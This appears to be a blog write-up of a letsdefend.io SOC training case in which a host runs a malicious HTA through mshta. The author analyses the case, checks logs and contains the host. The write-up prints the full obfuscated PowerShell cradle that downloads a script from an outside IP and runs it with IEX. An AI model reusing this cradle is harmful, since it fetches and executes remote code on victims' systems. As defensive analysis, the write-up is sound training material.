---
layout: post
published: false
title: [write up] letsdefend.io: suspicious mshta behavior
author: admin
comments: true
date: '2022-04-15 23:00'
categories:
  - DFIR
---

I've been trying out letsdefend.io for a couple of week, and here's a write up of one of the challenge. If you've never tried letsdefend, its a platform to hone your blue teaming skill, they got this SIEM like apps and you act like an analyst, finding IOC and deciding escalation etc. so here goes.
<!--more-->

![mshta behaviour](/images/wup_ld.png)

this is what the case looked like, basically a host execute a hta thus an alert is triggered. Our job is to see what really happened and do the intended playbook exercise. Some things that we can check to help with analysis are the IP address (we'll try command history & proccess history we found at the endpoint security tab), and the hash (virustotal). Afterward we are gonna decide on containment (eradication and recovery) and last the lesson learned from said incident.

#### virustotal

[virustotal](https://www.virustotal.com/gui/file/886095c7861a068d1ee603c71cb161f256941e802e743fe2161f30013947a2f1/detection)

virustotal result are bad, 23/58 malicious flag. if we are interested we could try to find the file and do more analysis, but for now I think we can move to endpoint security tabs and do more analysis there.

#### endpoint security

![wup_endpoint](/images/wup_endpoint.png)

We use end point security to find out what is really happening in the host 172.16.17.38. From the screenshot we can see that the first command line that trigger the alert, followed by weird command.

The first command is what triggered the alert. Mshta is a trusted Microsoft binary that in this case is abused to proxy for execution of the PS1.hta file. 
(https://attack.mitre.org/techniques/T1218/005/)

Tried a bit of magic at the second command, so down here, we can see a more bearable presentation. $H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". $H2 was a glorified "New-Object Net.WebClient". and $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8 (http://193.142.58.23/Server.txt).

```bash
function H1($i) 
{$r = '' ; for ($n = 0; $n -Lt $i.LengtH; $n += 2)
{$r += [cHar][int]('0x' + $i.Substring($n,2))}return $r};
$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));
$H3 = H1 '446f776E';
$H4 = H1 '6C6f';
$H5 = H1 '616473747269';
$H6 = H1 '6E67';
$H7 = $H3+$H4+$H5+$H6;
$H8 = $H2.$H7('http://193.142.58.23/Server.txt');
iEX $H8
```

#### log management

After seeing what the script do, we best check log management and try to see did the server reply with anything.

![wup_endpoint](/images/wup_logmgmt.png)

Appereantly the server reply with 404, so no response arrived for the host (172.16.17.38) because the server (or the inteded file) is dead/ not there.

#### containment and lesson learned

since it's definetly a malicious script (but stopped due to the C2 server is dead), it's best to contain the host. We can do this by going to endpoint security and click the request containment. 

The IP address, and URL and also the md5 hash of the executed file can then be use as IOC when we did the playbook and also close the case.


